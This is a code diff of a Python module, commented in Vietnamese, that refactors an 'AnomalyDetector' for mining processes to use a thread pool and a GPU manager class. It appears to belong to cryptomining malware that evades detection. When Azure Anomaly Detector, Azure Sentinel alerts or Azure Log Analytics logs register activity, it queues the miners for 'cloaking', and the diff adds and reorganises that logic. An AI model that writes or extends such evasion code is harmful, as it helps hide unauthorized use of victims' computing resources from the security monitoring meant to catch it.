@@ -4,26 +4,24 @@ import os
 import psutil
 import pynvml
 import logging
+import traceback
 from time import sleep, time
 from pathlib import Path
-from threading import Lock, Event, Thread
+from queue import Queue, Empty
+from threading import Lock, Event
 from typing import List, Any, Dict, Optional
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from .base_manager import BaseManager
-from .utils import MiningProcess
-
+from .utils import MiningProcess, GPUManager
 from .auxiliary_modules.power_management import (
     get_cpu_power,
     get_gpu_power
 )
-
 from .auxiliary_modules.temperature_monitor import (
     get_cpu_temperature,
     get_gpu_temperature
 )
-
-# Loại bỏ các import không sử dụng
-# from concurrent.futures import ThreadPoolExecutor, as_completed
 
 class SafeRestoreEvaluator:
     """
@@ -198,23 +196,22 @@ class AnomalyDetector(BaseManager):
         self.mining_processes: List[MiningProcess] = []
         self.mining_processes_lock = Lock()
 
-        self.anomaly_thread = Thread(
-            target=self.anomaly_detection,
-            name="AnomalyDetectionThread",
-            daemon=True
-        )
-
-        # Khởi tạo NVML để quản lý GPU nếu có
-        try:
-            pynvml.nvmlInit()
-            self.gpu_initialized = True
-            self.logger.info("NVML initialized successfully.")
-        except pynvml.NVMLError as e:
-            self.logger.error(f"Failed to initialize NVML: {e}")
-            self.gpu_initialized = False
+        self.gpu_manager = GPUManager()
+        self.gpu_initialized = self.gpu_manager.gpu_initialized
+        if self.gpu_initialized:
+            self.logger.info("GPUManager đã được khởi tạo thành công.")
+        else:
+            self.logger.warning("GPUManager không được khởi tạo. Các chức năng liên quan đến GPU sẽ bị vô hiệu hóa.")
 
         self.resource_manager = None
         self.safe_restore_evaluator = None
+
+        # Sử dụng ThreadPoolExecutor để quản lý thread pool
+        self.executor = ThreadPoolExecutor(max_workers=5)
+        self.task_futures = []
+
+        # Queue để enqueue các yêu cầu cloaking
+        self.cloaking_request_queue = Queue()
 
     def set_resource_manager(self, resource_manager):
         """
@@ -232,30 +229,17 @@ class AnomalyDetector(BaseManager):
             self.resource_manager
         )
 
+        # Start the anomaly detection task
+        future = self.executor.submit(self.anomaly_detection)
+        self.task_futures.append(future)
+
     def start(self):
         """
         Bắt đầu AnomalyDetector, bao gồm việc khởi động thread phát hiện bất thường.
         """
         self.logger.info("Starting AnomalyDetector...")
-        self.anomaly_thread.start()
+        self.discover_mining_processes()
         self.logger.info("AnomalyDetector started successfully.")
-
-    def stop(self):
-        """
-        Dừng AnomalyDetector, bao gồm việc dừng thread phát hiện bất thường và shutdown NVML.
-        """
-        self.logger.info("Stopping AnomalyDetector...")
-        self.stop_event.set()
-        self.anomaly_thread.join()
-
-        if self.gpu_initialized:
-            try:
-                pynvml.nvmlShutdown()
-                self.logger.info("NVML shutdown successfully.")
-            except pynvml.NVMLError as e:
-                self.logger.error(f"Failed to shutdown NVML: {e}")
-
-        self.logger.info("AnomalyDetector stopped successfully.")
 
     def discover_mining_processes(self):
         """
@@ -304,7 +288,8 @@ class AnomalyDetector(BaseManager):
 
     def anomaly_detection(self):
         """
-        Thread để phát hiện bất thường trong các tiến trình khai thác.
+        Task để phát hiện bất thường trong các tiến trình khai thác.
+        Sử dụng ThreadPoolExecutor để xử lý các tiến trình song song.
         """
         detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 3600)
         cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
@@ -327,49 +312,121 @@ class AnomalyDetector(BaseManager):
                     self.logger.error("ResourceManager is not set. Cannot proceed with anomaly detection.")
                     continue
 
+                # Copy the list to avoid holding the lock while processing
                 with self.mining_processes_lock:
-                    for process in self.mining_processes:
-                        process.update_resource_usage()
+                    processes = list(self.mining_processes)
 
-                        # 1) Phát hiện bất thường qua Azure Anomaly Detector
-                        current_state = self.resource_manager.collect_metrics(process)
-                        anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
-                        if anomalies_detected:
-                            self.logger.warning(
-                                f"Anomaly detected in process {process.name} (PID: {process.pid}) via Azure Anomaly Detector. "
-                                f"Initiating cloaking in {cloak_activation_delay} seconds."
+                # Sử dụng ThreadPoolExecutor để xử lý các tiến trình song song
+                with ThreadPoolExecutor(max_workers=5) as executor:
+                    future_to_process = {
+                        executor.submit(self.evaluate_process_anomaly, process, cloak_activation_delay): process
+                        for process in processes
+                    }
+
+                    for future in as_completed(future_to_process):
+                        process = future_to_process[future]
+                        try:
+                            future.result()
+                        except Exception as e:
+                            self.logger.error(
+                                f"Lỗi khi đánh giá tiến trình {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
                             )
-                            sleep(cloak_activation_delay)
-                            self.resource_manager.cloaking_request_queue.put(process)
-                            process.is_cloaked = True
-                            continue
-
-                        # 2) Kiểm tra alerts từ Azure Sentinel
-                        alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=2)
-                        if isinstance(alerts, list) and len(alerts) > 0:
-                            self.logger.warning(
-                                f"Detected {len(alerts)} alerts from Azure Sentinel for PID: {process.pid}"
-                            )
-                            self.resource_manager.cloaking_request_queue.put(process)
-                            process.is_cloaked = True
-                            continue
-
-                        # 3) Kiểm tra AML logs từ Azure Log Analytics
-                        aml_logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
-                        if isinstance(aml_logs, list) and len(aml_logs) > 0:
-                            self.logger.warning(
-                                f"Detected AML logs từ AzureDiagnostics => Cloaking process {process.name} (PID={process.pid})."
-                            )
-                            self.resource_manager.cloaking_request_queue.put(process)
-                            process.is_cloaked = True
-                            continue
-
-                        # Các kiểm tra khác đã bị loại bỏ
 
             except Exception as e:
-                self.logger.error(f"Error in anomaly_detection: {e}")
+                self.logger.error(f"Error in anomaly_detection: {e}\n{traceback.format_exc()}")
 
             sleep(1)  # Nghỉ ngắn để tránh vòng lặp quá sát
+
+    def evaluate_process_anomaly(self, process: MiningProcess, cloak_activation_delay: int):
+        """
+        Đánh giá bất thường cho một tiến trình cụ thể và enqueue cloaking nếu cần.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình khai thác.
+            cloak_activation_delay (int): Thời gian trì hoãn trước khi kích hoạt cloaking (giây).
+        """
+        try:
+            # 1) Phát hiện bất thường qua Azure Anomaly Detector
+            current_state = self.resource_manager.collect_metrics(process)
+            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
+            if anomalies_detected:
+                self.logger.warning(
+                    f"Anomaly detected in process {process.name} (PID: {process.pid}) via Azure Anomaly Detector. "
+                    f"Initiating cloaking in {cloak_activation_delay} seconds."
+                )
+                sleep(cloak_activation_delay)
+                self.enqueue_cloaking(process)
+                process.is_cloaked = True
+                return
+
+            # 2) Kiểm tra alerts từ Azure Sentinel
+            alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=2)
+            if isinstance(alerts, list) and len(alerts) > 0:
+                self.logger.warning(
+                    f"Detected {len(alerts)} alerts from Azure Sentinel for PID: {process.pid}"
+                )
+                self.enqueue_cloaking(process)
+                process.is_cloaked = True
+                return
+
+            # 3) Kiểm tra AML logs từ Azure Log Analytics
+            aml_logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
+            if isinstance(aml_logs, list) and len(aml_logs) > 0:
+                self.logger.warning(
+                    f"Detected AML logs từ AzureDiagnostics => Cloaking process {process.name} (PID={process.pid})."
+                )
+                self.enqueue_cloaking(process)
+                process.is_cloaked = True
+                return
+
+            # Các kiểm tra khác đã bị loại bỏ
+
+        except Exception as e:
+            self.logger.error(f"Error in evaluate_process_anomaly for PID={process.pid}: {e}\n{traceback.format_exc()}")
+
+    def enqueue_cloaking(self, process: MiningProcess):
+        """
+        Enqueue tiến trình vào queue yêu cầu cloaking.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình khai thác.
+        """
+        try:
+            self.cloaking_request_queue.put(process, timeout=5)
+            self.logger.info(f"Enqueued cloaking request for process {process.name} (PID={process.pid}).")
+        except Exception as e:
+            self.logger.error(f"Failed to enqueue cloaking request for PID={process.pid}: {e}\n{traceback.format_exc()}")
+
+    def process_cloaking_requests(self):
+        """
+        Task để xử lý các yêu cầu cloaking từ queue.
+        Sử dụng ThreadPoolExecutor để xử lý song song các yêu cầu cloaking.
+        """
+        while not self.stop_event.is_set():
+            try:
+                process = self.cloaking_request_queue.get(timeout=1)
+                # Submit cloaking task to executor
+                future = self.executor.submit(self.apply_cloaking, process)
+                self.task_futures.append(future)
+            except Empty:
+                continue
+            except Exception as e:
+                self.logger.error(
+                    f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}\n{traceback.format_exc()}"
+                )
+
+    def apply_cloaking(self, process: MiningProcess):
+        """
+        Áp dụng cloaking cho một tiến trình.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình khai thác.
+        """
+        try:
+            self.resource_manager.cloaking_request_queue.put(process, timeout=5)
+            self.logger.info(f"Applied cloaking for process {process.name} (PID={process.pid}).")
+        except Exception as e:
+            self.logger.error(f"Lỗi khi áp dụng cloaking cho PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
         """
@@ -462,30 +519,19 @@ class AnomalyDetector(BaseManager):
         Returns:
             float: Phần trăm sử dụng GPU.
         """
-        if not self.gpu_initialized:
-            self.logger.warning("GPU not initialized. Cannot get GPU memory percent.")
+        if not self.gpu_manager.gpu_initialized:
+            self.logger.warning("GPUManager chưa được khởi tạo. Không thể lấy phần trăm sử dụng GPU.")
             return 0.0
 
         try:
-            gpu_memory_total = 0
-            gpu_memory_used = 0
-            for i in range(pynvml.nvmlDeviceGetCount()):
-                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
-                mem_info = pynvml.nvmlDeviceGetMemoryInfo(handle)
-                gpu_memory_total += mem_info.total
-                gpu_memory_used += mem_info.used
-                self.logger.debug(
-                    f"GPU {i} Memory Usage: {mem_info.used / mem_info.total * 100:.2f}%"
-                )
+            gpu_memory_total = self.gpu_manager.get_total_gpu_memory()
+            gpu_memory_used = self.gpu_manager.get_used_gpu_memory()
 
             if gpu_memory_total == 0:
                 return 0.0
             return (gpu_memory_used / gpu_memory_total) * 100
-        except pynvml.NVMLError as e:
-            self.logger.error(f"Error getting GPU memory percent: {e}")
-            return 0.0
         except Exception as e:
-            self.logger.error(f"Unexpected error getting GPU memory percent: {e}")
+            self.logger.error(f"Lỗi bất ngờ khi lấy phần trăm sử dụng GPU: {e}")
             return 0.0
 
     def get_gpu_temperature(self, pid: Optional[int] = None) -> float:
@@ -504,3 +550,13 @@ class AnomalyDetector(BaseManager):
             self.logger.debug(f"Average GPU Temperature: {avg_temp}°C")
             return avg_temp
         return 0.0
+
+    def stop(self):
+        """
+        Dừng AnomalyDetector, bao gồm việc dừng thread phát hiện bất thường và shutdown ThreadPoolExecutor.
+        """
+        self.logger.info("Stopping AnomalyDetector...")
+        self.stop_event.set()
+        # Wait for all submitted tasks to complete
+        self.executor.shutdown(wait=True)
+        self.logger.info("AnomalyDetector stopped successfully.")
